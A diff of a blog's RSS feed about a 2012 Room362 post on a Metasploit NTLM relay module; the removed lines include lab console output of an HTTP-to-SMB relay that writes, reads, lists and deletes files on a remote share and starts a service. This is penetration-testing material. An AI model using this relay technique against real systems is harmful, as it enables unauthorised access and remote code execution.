@@ -1,13 +1,16 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Room362</title>
-    <link>https://room362.com/categories/pth/index.xml</link>
-    <description>Recent content on Room362</description>
+    <title>Pth on Room362</title>
+    <link>https://room362.com/categories/pth/</link>
+    <description>Recent content in Pth on Room362</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&amp;copy; 2016. All rights reserved.</copyright>
-    <atom:link href="https://room362.com/categories/pth/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 10 Jul 2012 06:02:40 +0000</lastBuildDate>
+    
+	<atom:link href="https://room362.com/categories/pth/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>Cross-Protocol Chained Pass the Hash for Metasploit</title>
@@ -15,69 +18,12 @@
       <pubDate>Tue, 10 Jul 2012 06:02:40 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/</guid>
-      <description>&lt;p&gt;Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201207_pth_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Twitter Link: &lt;a href=&#34;https://twitter.com/webstersprodigy/status/222529916783169536&#34;&gt;https://twitter.com/webstersprodigy/status/222529916783169536&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Which has a link to here: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/589&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/589&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Demo / Example resource files: &lt;a href=&#34;https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170&#34;&gt;https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;You can pull the fork w/ branch from here: &lt;a href=&#34;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&#34;&gt;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;And as soon as you do you can start doing this (&lt;strong&gt;&lt;em&gt;using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded&lt;/em&gt;&lt;/strong&gt;):&lt;/p&gt;
-
-&lt;p&gt;163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto. This is an HTTP request resulting in a SMB Relay&amp;rsquo;d auth. It looks as though multiple targets can be used as relay targets but I haven&amp;rsquo;t tested this out yet.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_put&#39; from 172.16.10.163:52327
-[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
-[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
-[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt written
-[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_get&#39; from 172.16.10.163:52328
-[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
-[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
-[*] 172.16.10.163 http_ntlmrelay - Reading 13 bytes from 172.16.10.182
-[*] 172.16.10.163 http_ntlmrelay - ----Contents----
-[*] 172.16.10.163 http_ntlmrelay - hi ima secret
-[*] 172.16.10.163 http_ntlmrelay - ----End Contents----
-[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_enum&#39; from 172.16.10.163:52329
-[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
-[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
-[*] 172.16.10.163 http_ntlmrelay - Shares enumerated 172.16.10.182 IPC$ ADMIN$ C$
-[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_ls&#39; from 172.16.10.163:52330
-[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
-[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
-[*] 172.16.10.163 http_ntlmrelay - Listed 13 files from 172.16.10.182c$
-[*] 172.16.10.163 http_ntlmrelay - .rnd
-[*] 172.16.10.163 http_ntlmrelay - PerfLogs
-[*] 172.16.10.163 http_ntlmrelay - config.sys
-[*] 172.16.10.163 http_ntlmrelay - inetpub
-[*] 172.16.10.163 http_ntlmrelay - xampp
-[*] 172.16.10.163 http_ntlmrelay - ProgramData
-[*] 172.16.10.163 http_ntlmrelay - MSOCache
-[*] 172.16.10.163 http_ntlmrelay - secret.txt
-[*] 172.16.10.163 http_ntlmrelay - autoexec.bat
-[*] 172.16.10.163 http_ntlmrelay - Windows
-[*] 172.16.10.163 http_ntlmrelay - Users
-[*] 172.16.10.163 http_ntlmrelay - Program Files
-[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_rm&#39; from 172.16.10.163:52332
-[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
-[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
-[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt deleted
-[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_pwn&#39; from 172.16.10.163:52333
-[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
-[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
-[*] 172.16.10.163 http_ntlmrelay - Obtraining a service manager handle...
-[*] 172.16.10.163 http_ntlmrelay - Creating a new service
-[*] 172.16.10.163 http_ntlmrelay - Closing service handle...
-[*] 172.16.10.163 http_ntlmrelay - Opening service...
-[*] 172.16.10.163 http_ntlmrelay - Starting the service...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Let the fun begin&amp;hellip;&lt;/p&gt;
-</description>
+      <description>Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:
+Twitter Link: https://twitter.com/webstersprodigy/status/222529916783169536
+Which has a link to here: https://github.com/rapid7/metasploit-framework/pull/589
+Demo / Example resource files: https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170
+You can pull the fork w/ branch from here: https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay
+And as soon as you do you can start doing this (using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded):</description>
     </item>
     
   </channel>
